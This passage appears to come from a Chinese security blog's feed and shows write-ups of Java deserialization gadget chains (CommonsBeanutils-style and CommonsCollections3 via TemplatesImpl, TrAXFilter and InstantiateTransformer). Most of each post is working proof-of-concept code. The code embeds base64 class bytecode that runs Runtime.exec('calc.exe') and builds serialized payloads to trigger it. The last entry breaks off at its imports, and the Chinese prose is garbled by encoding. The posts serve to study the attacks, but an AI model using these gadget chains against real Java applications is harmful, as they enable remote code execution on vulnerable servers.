class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>        property.setAccessible(<span class="hljs-literal">true</span>);<br>        property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>å“ˆå“ˆå“ˆå…ˆæ°´ä¸€ä¸‹ROMEï¼Œå¾…ä¼šåœ¨æ¥~~åƒé¥­å»äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ccé“¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollection3</title>
    <link href="/2022/03/05/CommonCollection3/"/>
    <url>/2022/03/05/CommonCollection3/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>ä¸ºä»€ä¹ˆæœ‰cc3ï¼Œå…¶å®æ˜¯cc1çš„<strong>InvokerTransformer</strong>è¢«ç¦ç”¨äº†ï¼ˆæ— æ³•è¢«ååºåˆ—åŒ–ï¼‰ã€‚<br>é‚£ä¹ˆè¿™é‡Œcc3å‡ºç°äº†<strong>TrAXFilter</strong></p><h2 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051051149.png" alt="QQæˆªå›¾20220305105118"></p><p>è¿™é‡Œå°±ç›´æ¥åœ¨å…¶æ„é€ æ–¹æ³•ä¸­ä½¿ç”¨äº†<strong>newTransformer()<strong>ã€‚ä¸€ç›´è·Ÿè¿›</strong>newTransformerï¼ˆï¼‰</strong>ä¼šæ¥åˆ°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051203589.png" alt="QQæˆªå›¾20220305110525"></p><p>åç»­åˆ©ç”¨ä¸ä¹…æ˜¯<strong>TemplatesImpl</strong>äº†å—ï¼Ÿ</p><p>é‚£ä¹ˆå¦‚ä½•åˆ©ç”¨è¿™ä¸ªç±»å‘¢ï¼Ÿ</p><h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051101285.png" alt="QQæˆªå›¾20220305110121"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051203909.png" alt="QQæˆªå›¾20220305110137"></p><p>åœ¨è¯¥ç±»ä¸­çš„**transform()**é‡Œä½¿ç”¨åå°„ç›´æ¥åˆ›å»ºå‡ºä¸€ä¸ªå®ä¾‹ã€‚</p><p>é‚£ä¹ˆè¿™ä¸å°±æ˜¯å¯ä»¥ç›´æ¥ä¸åˆ©ç”¨InvokerTransformeräº†ï¼Ÿ</p><h2 id="åˆ©ç”¨ä»£ç "><a href="#åˆ©ç”¨ä»£ç " class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = &#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>       &#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„åŠŸèƒ½ç›¸å½“äºæ˜¯å®ç°äº†è¿”å›<strong>TrAXFilter</strong>ç±»ï¼Œç„¶åé€šè¿‡ <strong>InstantiateTransformer</strong>å®ä¾‹åŒ–<strong>TrAXFilter</strong>ç±»ï¼Œç„¶åå°±ä¼šè°ƒç”¨å…¶æ„é€ æ–¹æ³•ã€‚ä»è€Œè°ƒç”¨**newTransformer()**ã€‚æ¥ç€å°±æ˜¯cc1çš„å†…å®¹äº†ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc3Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Override.class, lazyMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Override.class, mapProxy);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>     <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>     objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ccé“¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections3ï¼ˆTemplatesImplï¼‰</title>
    <link href="/2022/03/04/CommonsCollections3%EF%BC%88TemplatesImpl%EF%BC%89/"/>
    <url>/2022/03/04/CommonsCollections3%EF%BC%88TemplatesImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3ï¼ˆTemplatesImplï¼‰"><a href="#CommonsCollections3ï¼ˆTemplatesImplï¼‰" class="headerlink" title="CommonsCollections3ï¼ˆTemplatesImplï¼‰"></a>CommonsCollections3ï¼ˆTemplatesImplï¼‰</h1><p>ysoserialç”¨cc2æ˜¯è¿™ç§åŠæ³•ã€‚è¿™é‡Œå°±å°†å°±ä¸€ä¸‹ï¼Œç”¨cc3æ¥å®Œæˆè¿™ä¸ªæ•ˆæœã€‚æœ¬è´¨ä¸Šæœ¨æœ‰åŒºåˆ«ã€‚æƒ³å½“äºæ˜¯<strong>TemplatesImpl+cc1çš„ååŠæ®µ</strong>ã€‚æ„Ÿè§‰ä¼šäº†ï¼Œå°±ä¸ç»§ç»­å¤ä¹ äº†ã€‚<strong>ï¼ˆè¿™é‡Œè¿˜æ˜¯åˆ©ç”¨äº†InvokerTransformerï¼‰</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> 